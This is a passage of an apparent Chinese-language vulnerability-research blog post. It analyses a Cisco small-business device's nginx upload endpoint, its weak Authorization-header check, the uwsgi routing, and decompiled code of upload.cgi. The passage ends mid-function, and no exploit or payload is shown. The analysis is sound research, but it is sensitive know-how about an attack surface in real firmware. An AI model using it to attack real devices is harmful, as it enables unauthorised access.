class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">location /api/operations/ciscosb-file:form-file-upload &#123;</span><br><span class="line">set $deny <span class="number">1</span>;</span><br><span class="line"> </span><br><span class="line">if ($http_authorization != &quot;&quot;) &#123;</span><br><span class="line">set $deny &quot;<span class="number">0</span>&quot;;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">if ($deny = &quot;<span class="number">1</span>&quot;) &#123;</span><br><span class="line">return <span class="number">403</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">upload_pass /<span class="selector-tag">form</span>-file-upload;</span><br><span class="line">upload_store /tmp/upload;</span><br><span class="line">upload_store_access user:rw group:rw all:rw;</span><br><span class="line">upload_set_form_field $upload_field_name<span class="selector-class">.name</span> &quot;$upload_file_name&quot;;</span><br><span class="line">upload_set_form_field $upload_field_name<span class="selector-class">.content_type</span> &quot;$upload_content_type&quot;;</span><br><span class="line">upload_set_form_field $upload_field_name<span class="selector-class">.path</span> &quot;$upload_tmp_path&quot;;</span><br><span class="line">upload_aggregate_form_field &quot;$upload_field_name<span class="selector-class">.md5</span>&quot; &quot;$upload_file_md5&quot;;</span><br><span class="line">upload_aggregate_form_field &quot;$upload_field_name<span class="selector-class">.size</span>&quot; &quot;$upload_file_size&quot;;</span><br><span class="line">upload_pass_form_field &quot;^.*$&quot;;</span><br><span class="line">upload_cleanup <span class="number">400</span> <span class="number">404</span> <span class="number">499</span> <span class="number">500</span>-<span class="number">505</span>;</span><br><span class="line">upload_resumable on;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><blockquote><p>location块的主要作用是 基于Nginx服务器接收到的字符串（例如&#x2F;api&#x2F;operations&#x2F;ciscosb-file:form-file-upload），对除虚拟主机名称之外的字符串进行匹配，对特定的请求进行处理。地址定向、数据缓存和应答控制等功能都是在这部分实现</p><p>在Nginx的官方文档中定义的location的语法结构为：</p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">location <span class="selector-attr">[ = | ~ | ~* | ^~ ]</span> uri &#123; ... &#125;</span><br></pre></td></tr></table></figure><p>其中uri就是我们的&#x2F;api….那一串，它也可以含正则表达</p></blockquote><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">if ($http_authorization != &quot;&quot;) &#123;</span><br><span class="line">    set $deny &quot;<span class="number">0</span>&quot;;</span><br><span class="line">&#125;</span><br><span class="line">if ($deny = &quot;<span class="number">1</span>&quot;) &#123;</span><br><span class="line">    return <span class="number">403</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>匹配完成之后会对http_authorization进行判断，全局搜索这个变量发现在&#x2F;etc&#x2F;nginx&#x2F;conf.d&#x2F;proxy.conf中对其进行了定义</p><p><img src="https://cdn.jsdelivr.net/gh/s1nec-1o/photo@main/img/202408112331142.png" alt="image-20240811133551968"></p><p>因此就是对Authorization这个环境变量进行判定，猜测是身份证明，如果没有的话就会403报错</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">upload_pass /form-file-upload;</span><br><span class="line">upload_store /tmp/upload;</span><br><span class="line">upload_store_access user:rw group:rw all:rw;</span><br><span class="line">upload_set_form_field $upload_field_name.name <span class="string">&quot;$upload_file_name&quot;</span>;</span><br><span class="line">upload_set_form_field $upload_field_name.content_type <span class="string">&quot;$upload_content_type&quot;</span>;</span><br><span class="line">upload_set_form_field $upload_field_name.path <span class="string">&quot;$upload_tmp_path&quot;</span>;</span><br><span class="line">upload_aggregate_form_field <span class="string">&quot;$upload_field_name.md5&quot;</span> <span class="string">&quot;$upload_file_md5&quot;</span>;</span><br><span class="line">upload_aggregate_form_field <span class="string">&quot;$upload_field_name.size&quot;</span> <span class="string">&quot;$upload_file_size&quot;</span>;</span><br><span class="line">upload_pass_form_field <span class="string">&quot;^.*$&quot;</span>;</span><br><span class="line">upload_cleanup <span class="number">400</span> <span class="number">404</span> <span class="number">499</span> <span class="number">500</span><span class="number">-505</span>;</span><br><span class="line">upload_resumable on;</span><br></pre></td></tr></table></figure><p>之后便是对nginx upload module配置参数了</p><p><strong>upload_pass &#x2F;form-file-upload：</strong>指明了后续要处理的php文件，转到后端处理&#x2F;form-file-upload这个参数</p><p><strong>upload_store &#x2F;tmp&#x2F;upload：</strong>指定了上传文件的存放地址</p><p><strong>upload_store_access user:rw group:rw all:rw：</strong>上传文件的访问权限，所有人都是rw</p><p><strong>upload_set_form_field $upload_field_name.name “$upload_file_name”：</strong>设置参数</p><p><strong>upload_pass_form_field “^.*$”：</strong>从表单原样转到后端参数，是一个正则匹配^表示开始，.表示任意字符，*表示可以出现零次或多次，$是结束，因此说明可以上传任意字符到后端</p><p><strong>upload_cleanup 400 404 499 500-505：</strong>如果出现了400 404等这些错误就删除所有上传的文件</p><p>在这里没有对cookie_sessionid进行判断</p><blockquote><p><code>cookie_sessionid</code></p><ul><li><strong>用途</strong>: 存储用户的会话标识符。</li><li><strong>作用</strong>: 服务器使用这个标识符来识别用户的会话状态，保持用户登录状态，或跟踪用户活动。</li></ul><p><code>Authorization</code></p><ul><li><strong>用途</strong>: 包含认证凭据。</li><li><strong>作用</strong>: 用于向服务器提供用户的身份信息，通常在 HTTP 请求头中使用。</li></ul></blockquote><p>我对其的理解就是没登陆，就能上传文件，这或许也是一种未授权的判定方法？</p><p><img src="https://cdn.jsdelivr.net/gh/s1nec-1o/photo@main/img/202408112331143.png" alt="image-20240811140200582"></p><p>可以看到正规的&#x2F;upload是存在对cookie_sessionid的判定的，($cookie_sessionid ~* “^[a-f0-9]{64}”)正则匹配要确保它是一个有效的 64 位十六进制字符串</p><p>之后看&#x2F;form-file-upload到底是什么</p><p><img src="https://cdn.jsdelivr.net/gh/s1nec-1o/photo@main/img/202408112331144.png" alt="image-20240811140509385"></p><blockquote><p>include指令：用于包含其他的配置文件</p></blockquote><p>其中包含了uwsgi_params这个配置文件，在&#x2F;etc&#x2F;nginx&#x2F;uwsgi_params，是一种用于<em>配置</em>与Nginx 之间的通信的文件。它定义了一些变量和选项，以确保正确地传递请求和响应。算是一种通用配置</p><p>uwsgi_pass指向uwsgi服务器IP和端口，设置读取和发送超时时间为3600秒</p><p>说明了它把请求发送给了uwsgi的服务器来处理</p><p>那么处理的文件是什么，我们先看nginx的启动程序</p><p><img src="https://cdn.jsdelivr.net/gh/s1nec-1o/photo@main/img/202408112331145.png" alt="image-20240811142007666"></p><p>在最后启动了uwsgi程序</p><p><img src="https://cdn.jsdelivr.net/gh/s1nec-1o/photo@main/img/202408112331146.png" alt="image-20240811142047541"></p><p>可以看到uwsgi的启动程序指定为&#x2F;usr&#x2F;bin&#x2F;uwsgi-launcher程序</p><p><img src="https://cdn.jsdelivr.net/gh/s1nec-1o/photo@main/img/202408112331147.png" alt="image-20240811142219102"></p><p>它执行了三个初始化程序，分别看一下</p><figure class="highlight nginx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">[uwsgi]</span><br><span class="line"><span class="attribute">plugins</span> = cgi</span><br><span class="line">workers = <span class="number">4</span></span><br><span class="line">master = <span class="number">1</span></span><br><span class="line">uid = www-data</span><br><span class="line">gid = www-data</span><br><span class="line">socket=<span class="number">127.0.0.1:9000</span></span><br><span class="line">buffer-size=<span class="number">4096</span></span><br><span class="line">cgi = /jsonrpc=/www/cgi-bin/jsonrpc.cgi</span><br><span class="line">cgi-allowed-ext = .cgi</span><br><span class="line">cgi-allowed-ext = .pl</span><br><span class="line">cgi-timeout = <span class="number">3600</span></span><br><span class="line">ignore-sigpipe = <span class="literal">true</span></span><br></pre></td></tr></table></figure><p>首先是启用了CGi插件来处理CGI脚本，配置了四个工作进程来处理请求，启用了主进程管理工作进程，设置身份，监听9000端口，设置缓冲区大小为4096，将 <code>/jsonrpc</code> 路径映射到 <code>/www/cgi-bin/jsonrpc.cgi</code> 脚本，允许运行的为.cgi .pl的扩展名，忽略了signal信号。总之就是监听9000端口，运行cgi脚本。接下来的两个ini也是如此，就不过多赘述了，但是看到我们之前分析的&#x2F;upload的uswgi是发送到9003端口来处理请求的，因此看到</p><p><img src="https://cdn.jsdelivr.net/gh/s1nec-1o/photo@main/img/202408112331148.png" alt="image-20240811142811028"></p><p>发现是&#x2F;www&#x2F;cgi-bin&#x2F;upload-cgi来处理请求的，调用的方式是先 <code>fork</code> 了一个子进程，然后 <code>execvp</code> 来执行 <code>upload.cgi</code></p><h2 id="二进制文件分析"><a href="#二进制文件分析" class="headerlink" title="二进制文件分析"></a>二进制文件分析</h2><h3 id="StrBuf系列函数"><a href="#StrBuf系列函数" class="headerlink" title="StrBuf系列函数"></a>StrBuf系列函数</h3><p>在分析upload-cgi前要先看一些自定义函数的定义，不然会较难分析</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">_DWORD *<span class="title">StrBufCreate</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  _DWORD *v0; <span class="comment">// r4</span></span><br><span class="line">  _BYTE *v1; <span class="comment">// r0</span></span><br><span class="line"></span><br><span class="line">  v0 = <span class="built_in">malloc</span>(<span class="number">0xC</span>u);</span><br><span class="line">  <span class="keyword">if</span> ( v0 )</span><br><span class="line">  &#123;</span><br><span class="line">    v0[<span class="number">1</span>] = <span class="number">0x37</span>;</span><br><span class="line">    v1 = <span class="built_in">malloc</span>(<span class="number">0x37</span>u);</span><br><span class="line">    *v0 = v1;</span><br><span class="line">    <span class="keyword">if</span> ( !v1 )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="built_in">free</span>(v0);</span><br><span class="line">      <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    *v1 = <span class="number">0</span>;</span><br><span class="line">    v0[<span class="number">2</span>] = <span class="number">0</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> v0;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>StrBufCreate函数，没有参数，作用是创建一个三个地址长度的chunk，然后第二个长度写Buf的长度即0x37，低三个长度是0，第一个长度是Buf的地址，还算是比较清晰的</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">_DWORD *__fastcall <span class="title">StrBufAppendStr</span><span class="params">(_DWORD *a1, <span class="type">const</span> <span class="type">char</span> *a2)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  _DWORD *result; <span class="comment">// r0</span></span><br><span class="line">  <span class="type">size_t</span> v5; <span class="comment">// r5</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> ( !a2 || !<span class="built_in">StrBufIsOK</span>(a1) )</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">  v5 = <span class="built_in">strlen</span>(a2);</span><br><span class="line">  result = <span class="built_in">sub_1BBC</span>((<span class="type">void</span> **)a1, v5 + a1[<span class="number">2</span>] + <span class="number">1</span>);</span><br><span class="line">  <span class="keyword">if</span> ( result )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">strcpy</span>((<span class="type">char</span> *)(*a1 + a1[<span class="number">2</span>]), a2);</span><br><span class="line">    result = &amp;dword_0 + <span class="number">1</span>;</span><br><span class="line">    a1[<span class="number">2</span>] += v5;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>总体而言，这段代码实现了一个动态字符串缓冲区的管理，能够在原有字符串的基础上追加新的字符串，同时确保在追加时有足够的内存空间。如果内存不足，它会进行重新分配并处理相关的内存管理。</p><p>如果感兴趣可以自行分析</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="type">int</span> __fastcall <span class="title">StrBufSetStr</span><span class="params">(<span class="type">int</span> a1, <span class="type">int</span> a2)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="built_in">StrBufClear</span>(a1);</span><br><span class="line">  <span class="keyword">return</span> <span class="built_in">StrBufAppendStr</span>((_DWORD *)a1, (<span class="type">const</span> <span class="type">char</span> *)a2);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>便是清除a1，然后a2覆盖在a1里面，即可以理解为赋值</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">_DWORD *__fastcall <span class="title">StrBufToStr</span><span class="params">(_DWORD *a1)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  _DWORD *result; <span class="comment">// r0</span></span><br><span class="line"></span><br><span class="line">  result = <span class="built_in">StrBufIsOK</span>(a1);</span><br><span class="line">  <span class="keyword">if</span> ( result )</span><br><span class="line">    <span class="keyword">return</span> (_DWORD *)*a1;</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>判断是否合法，如果合法则返回地址，不合法就返回错误信息</p><h3 id="jsonutil系列函数"><a href="#jsonutil系列函数" class="headerlink" title="jsonutil系列函数"></a>jsonutil系列函数</h3><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="type">int</span> <span class="title">jsonutil_get_string</span><span class="params">(<span class="type">int</span> a1, _DWORD *a2, ...)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  va_list varg_r2; <span class="comment">// [sp+10h] [bp-8h] BYREF</span></span><br><span class="line"></span><br><span class="line">  <span class="built_in">va_start</span>(varg_r2, a2);</span><br><span class="line">  <span class="keyword">if</span> ( !<span class="built_in">jsonutil_vget</span>(a1, (<span class="type">int</span> *)varg_r2) )</span><br><span class="line">    <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">  *a2 = <span class="built_in">json_object_get_string</span>();</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>整体来看，这段代码的目的是从一个 JSON 对象中提取字符串。<code>jsonutil_get_string</code> 函数负责调用 <code>jsonutil_vget</code> 进行处理，而 <code>jsonutil_vget</code> 则通过不断检查和获取 JSON 对象的值，最终返回一个有效的索引或对象。若成功获取字符串，则将其存储在传入的指针 <code>*a2</code> 中。</p><h3 id="multi系列函数"><a href="#multi系列函数" class="headerlink" title="multi系列函数"></a>multi系列函数</h3><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="type">char</span> *__fastcall <span class="title">multipart_parser_init</span><span class="params">(<span class="type">const</span> <span class="type">char</span> *a1, <span class="type">int</span> a2)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="type">size_t</span> v4; <span class="comment">// r0</span></span><br><span class="line">  <span class="type">char</span> *v5; <span class="comment">// r4</span></span><br><span class="line">  <span class="type">size_t</span> v6; <span class="comment">// r0</span></span><br><span class="line">  <span class="type">char</span> *result; <span class="comment">// r0</span></span><br><span class="line"></span><br><span class="line">  v4 = <span class="built_in">strlen</span>(a1);</span><br><span class="line">  v5 = (<span class="type">char</span> *)<span class="built_in">malloc</span>(<span class="number">2</span> * v4 + <span class="number">37</span>);</span><br><span class="line">  <span class="built_in">strcpy</span>(v5 + <span class="number">24</span>, a1);</span><br><span class="line">  v6 = <span class="built_in">strlen</span>(a1);</span><br><span class="line">  *((_DWORD *)v5 + <span class="number">2</span>) = v6;</span><br><span class="line">  *((_DWORD *)v5 + <span class="number">1</span>) = <span class="number">0</span>;</span><br><span class="line">  *((_DWORD *)v5 + <span class="number">5</span>) = &amp;v5[v6 + <span class="number">25</span>];</span><br><span class="line">  result = v5;</span><br><span class="line">  v5[<span class="number">12</span>] = <span class="number">2</span>;</span><br><span class="line">  *((_DWORD *)v5 + <span class="number">4</span>) = a2;</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这段代码的功能是为一个多部分解析器分配内存并初始化其状态，包括存储输入字符串及其长度、设置一些状态字段等</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">multipart_parser_execute</span>(v12, v8, v13);该函数源码过长就不贴了</span><br></pre></td></tr></table></figure><p>主要的作用可能是用于解析HTTP请求中的<code>multipart/form-data</code>，但是由于可控段不在这里就不过多的分析了，详细请看下文</p><p><strong>分析到这里，我认为这些函数，想必是网上开源的函数，大概率是没有什么漏洞可言的，因此主要看函数的作用以及主函数的逻辑漏洞</strong></p><h3 id="cgi文件分析"><a href="#cgi文件分析" class="headerlink" title=".cgi文件分析"></a>.cgi文件分析</h3><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="type">int</span> __fastcall <span class="title">main</span><span class="params">(<span class="type">int</span> a1, <span class="type">char</span> **a2, <span class="type">char</span> **a3)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="type">const</span> <span class="type">char</span> *CONTENT_LENGTH_addr; <span class="comment">// r6</span></span><br><span class="line">  <span class="type">char</span> *CONTENT_TYPE_addr; <span class="comment">// r4</span></span><br><span class="line">  <span class="type">char</span> *REQUEST_URI_addr; <span class="comment">// r7</span></span><br><span class="line">  <span class="type">char</span> *HTTP_COOKIE_addr; <span class="comment">// r8</span></span><br><span class="line">  <span class="type">void</span> *v7; <span class="comment">// r0</span></span><br><span class="line">  _BYTE *v8; <span class="comment">// r5</span></span><br><span class="line">  <span class="type">char</span> *v9; <span class="comment">// r0</span></span><br><span class="line">  <span class="type">void</span> *v10; <span class="comment">// r0</span></span><br><span class="line">  <span class="type">int</span> v11; <span class="comment">// r0</span></span><br><span class="line">  <span class="type">int</span> v12; <span class="comment">// r6</span></span><br><span class="line">  <span class="type">size_t</span> v13; <span class="comment">// r0</span></span><br><span class="line">  <span class="type">char</span> *v14; <span class="comment">// r6</span></span><br><span class="line">  <span class="type">const</span> <span class="type">char</span> *v15; <span class="comment">// r3</span></span><br><span class="line">  <span class="type">int</span> v16; <span class="comment">// r6</span></span><br><span class="line">  <span class="type">int</span> v17; <span class="comment">// r8</span></span><br><span class="line">  <span class="type">int</span> v18; <span class="comment">// r0</span></span><br><span class="line">  <span class="type">int</span> v19; <span class="comment">// r6</span></span><br><span class="line">  <span class="type">int</span> v20; <span class="comment">// r6</span></span><br><span class="line">  <span class="type">int</span> v21; <span class="comment">// r0</span></span><br><span class="line">  <span class="type">int</span> v22; <span class="comment">// r8</span></span><br><span class="line">  <span class="type">int</span> v23; <span class="comment">// r7</span></span><br><span class="line">  <span class="type">int</span> v24; <span class="comment">// r6</span></span><br><span class="line">  <span class="type">int</span> v25; <span class="comment">// r0</span></span><br><span class="line">  <span class="type">const</span> <span class="type">char</span> *v26; <span class="comment">// r0</span></span><br><span class="line">  <span class="type">char</span> *haystack; <span class="comment">// [sp+14h] [bp-464h] BYREF</span></span><br><span class="line">  <span class="type">int</span> v29; <span class="comment">// [sp+18h] [bp-460h] BYREF</span></span><br><span class="line">  <span class="type">const</span> <span class="type">char</span> *v30; <span class="comment">// [sp+1Ch] [bp-45Ch] BYREF</span></span><br><span class="line">  <span class="type">int</span> v31; <span class="comment">// [sp+20h] [bp-458h] BYREF</span></span><br><span class="line">  <span class="type">int</span> v32; <span class="comment">// [sp+24h] [bp-454h] BYREF</span></span><br><span class="line">  <span class="type">int</span> v33; <span class="comment">// [sp+28h] [bp-450h] BYREF</span></span><br><span class="line">  <span class="type">int</span> v34; <span class="comment">// [sp+2Ch] [bp-44Ch] BYREF</span></span><br><span class="line">  <span class="type">int</span> v35; <span class="comment">// [sp+30h] [bp-448h] BYREF</span></span><br><span class="line">  <span class="type">int</span> v36; <span class="comment">// [sp+34h] [bp-444h] BYREF</span></span><br><span class="line">  <span class="type">int</span> boundary; <span class="comment">// [sp+38h] [bp-440h] BYREF</span></span><br><span class="line">  <span class="type">int</span> v38; <span class="comment">// [sp+3Ch] [bp-43Ch] BYREF</span></span><br><span class="line">  <span class="type">int</span> v39; <span class="comment">// [sp+40h] [bp-438h] BYREF</span></span><br><span class="line">  <span class="type">int</span> v40[<span class="number">7</span>]; <span class="comment">// [sp+44h] [bp-434h] BYREF</span></span><br><span class="line">  <span class="type">char</span> s[<span class="number">1048</span>]; <span class="comment">// [sp+60h] [bp-418h] BYREF</span></span><br><span class="line"></span><br><span class="line">  CONTENT_LENGTH_addr = <span class="built_in">getenv</span>(<span class="string">&quot;CONTENT_LENGTH&quot;</span>);</span><br><span class="line">  CONTENT_TYPE_addr = <span class="built_in">getenv</span>(<span class="string">&quot;CONTENT_TYPE&quot;</span>);</span><br><span class="line">  REQUEST_URI_addr = <span class="built_in">getenv</span>(<span class="string">&quot;REQUEST_URI&quot;</span>);</span><br><span class="line">  HTTP_COOKIE_addr = <span class="built_in">getenv</span>(<span class="string">&quot;HTTP_COOKIE&quot;</span>);</span><br><span class="line">  v7 = <span class="built_in">memset</span>(s, <span class="number">0</span>, <span class="number">0x400</span>u);</span><br><span class="line">  haystack = <span class="number">0</span>;</span><br><span class="line">  v29 = <span class="number">0</span>;</span><br><span class="line">  v30 = <span class="number">0</span>;</span><br><span class="line">  v31 = <span class="number">0</span>;</span><br><span class="line">  v32 = <span class="number">0</span>;</span><br><span class="line">  v33 = <span class="number">0</span>;</span><br><span class="line">  v34 = <span class="number">0</span>;</span><br><span class="line">  v35 = <span class="number">0</span>;</span><br><span class="line">  v36 = <span class="number">0</span>;</span><br><span class="line">  boundary = <span class="built_in">StrBufCreate</span>((<span class="type">int</span>)v7);</span><br><span class="line">  v38 = <span class="built_in">StrBufCreate</span>(boundary);</span><br><span class="line">  v39 = <span class="built_in">StrBufCreate</span>(v38);</span><br><span class="line">  <span class="keyword">if</span> ( CONTENT_LENGTH_addr )</span><br><span class="line">    CONTENT_LENGTH_addr = (<span class="type">const</span> <span class="type">char</span> *)<span class="built_in">atoi</span>(CONTENT_LENGTH_addr);</span><br><span class="line">  v8 = <span class="built_in">malloc</span>((<span class="type">size_t</span>)(CONTENT_LENGTH_addr + <span class="number">1</span>));</span><br><span class="line">  v8[<span class="built_in">fread</span>(v8, <span class="number">1u</span>, (<span class="type">size_t</span>)CONTENT_LENGTH_addr, (FILE *)_bss_start)] = <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">if</span> ( CONTENT_TYPE_addr &amp;&amp; <span class="built_in">strstr</span>(CONTENT_TYPE_addr, <span class="string">&quot;boundary=&quot;</span>) )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">StrBufSetStr</span>(boundary, <span class="string">&quot;--&quot;</span>);</span><br><span class="line">    v9 = <span class="built_in">strstr</span>(CONTENT_TYPE_addr, <span class="string">&quot;boundary&quot;</span>);</span><br><span class="line">    <span class="built_in">StrBufAppendStr</span>(boundary, v9 + <span class="number">9</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  v10 = <span class="built_in">memset</span>(v40, <span class="number">0</span>, <span class="built_in">sizeof</span>(v40));</span><br><span class="line">  v40[<span class="number">1</span>] = 